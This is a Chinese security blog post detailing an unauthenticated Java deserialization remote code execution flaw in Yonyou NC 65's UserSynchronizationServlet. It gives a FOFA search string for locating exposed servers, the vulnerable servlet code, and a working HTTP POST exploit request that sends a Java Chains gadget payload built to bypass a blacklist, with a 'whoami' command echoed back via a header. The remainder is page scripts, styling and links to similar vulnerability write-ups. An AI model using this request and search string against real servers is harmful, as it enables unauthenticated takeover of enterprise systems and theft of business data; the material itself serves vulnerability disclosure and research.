---
title: "用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-UserSynchronizationServlet-rce.html
asset_dir: assets/用友nc-usersynchronizationservlet反序列化代码执行rce漏洞
---

# 用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/7 08:42
* 725浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

Authorization

安全

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理软件，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`UserSynchronizationServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`UserSynchronizationServlet`反序列化该恶意对象时，就会触发代码执行。该漏洞可能允许攻击者在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞修复方案

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

深入探索

计算机安全

软件

身份验证

直接看下`UserSynchronizationServlet`的实现

```
public class UserSynchronizationServlet extends HttpServlet {
    private static final long serialVersionUID = 5734336943919144855L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

物流软件安全

深入探索

授权

网页浏览器

代码安全审计

# 漏洞复现

```
POST /servlet/UserSynchronizationServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行[命令执行](https://mrxn.net/tag/rce)回显payload

[![用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

[![用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞](images/img-002-d282c0c38b05.webp)](https://image.mrxn.net/82289231c30d4ee88852614a27e554d0.webp)

成功执行命令并回显执行结果

安全运维咨询

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞](https://mrxn.net/jswz/yonyou-nc-UserSynchronizationServlet-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-UserSynchronizationServlet-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-UserSynchronizationServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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